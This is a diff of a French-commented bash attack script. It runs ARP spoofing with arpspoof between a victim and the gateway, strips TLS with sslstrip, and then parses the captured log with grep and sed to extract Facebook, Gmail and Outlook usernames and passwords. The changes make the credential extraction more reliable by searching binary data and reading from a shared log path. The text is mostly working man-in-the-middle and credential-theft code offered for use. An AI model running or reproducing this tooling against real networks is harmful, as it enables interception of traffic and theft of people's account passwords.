@@ -246,10 +246,11 @@ while [ $sortie -eq "0" ]
 						arpspoof -i $iface -t $passerelle $vict 2> /dev/null &
 						arpspoof -i $iface -t $vict $passerelle 2> /dev/null &
 						clear
+						sleep 2
+						echo "debut" > sslstrip.log
 						resume $vict $passerelle
 						echo "\033[0;32mL'attaque est en cours\033[0m"
-						sleep 2
-						
+						sleep 2					
 					else
 						clear
 						echo "\033[0;31mL'attaque est déjà lancée\033[0m"
@@ -347,8 +348,8 @@ while [ $sortie -eq "0" ]
 #-------------------------------------Test sur le fichier termine-------------------------------------
 
 #-------------------------------------Verification des information de comptes-------------------------
-					facebook_login=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*email=\([^&]*\).*/\1/') #recup du login
-					facebook_pass=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*pass=\([^&]*\).*/\1/')
+					facebook_login=$(grep -a "email=" $chemin| grep -a "&pass=" | sed 's/.*email=\([^&]*\).*/\1/') #recup du login
+					facebook_pass=$(grep -a "email=" $chemin| grep -a "&pass=" | sed 's/.*pass=\([^&]*\).*/\1/')
 
 					if [ -z $facebook_login ] || [ -z $facebook_pass ] # On vérifie que que le login et le mot de passe ne sont pas vide
 						then
@@ -357,8 +358,8 @@ while [ $sortie -eq "0" ]
 							checkfb=0
 					fi
 
-					gmail_login=$(grep "Email=" $chemin | grep "&Passwd=" | sed 's/.*Email=\([^&]*\).*/\1/')
-					gmail_pass=$(grep "Email=" $chemin | grep "&Passwd=" | sed 's/.*Passwd=\([^&]*\).*/\1/')
+					gmail_login=$(grep -a "Email=" $chemin | grep -a "&Passwd=" | sed 's/.*Email=\([^&]*\).*/\1/')
+					gmail_pass=$(grep -a "Email=" $chemin | grep -a "&Passwd=" | sed 's/.*Passwd=\([^&]*\).*/\1/')
 
 					if [ -z $gmail_login ] || [ -z $gmail_pass ]
 						then
@@ -367,8 +368,8 @@ while [ $sortie -eq "0" ]
                						 checkgm=0
 						fi
 
-					outlook_login=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*login=\([^%]*\).*/\1/')
-					outlook_pass=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*passwd=\([^&]*\).*/\1/')
+					outlook_login=$(grep -a "login=" $chemin | grep -a "&passwd=" | sed 's/.*login=\([^%]*\).*/\1/')
+					outlook_pass=$(grep -a "login=" $chemin | grep -a "&passwd=" | sed 's/.*passwd=\([^&]*\).*/\1/')
 
 					if [ -z $outlook_login ] || [ -z $outlook_pass ]
 					        then
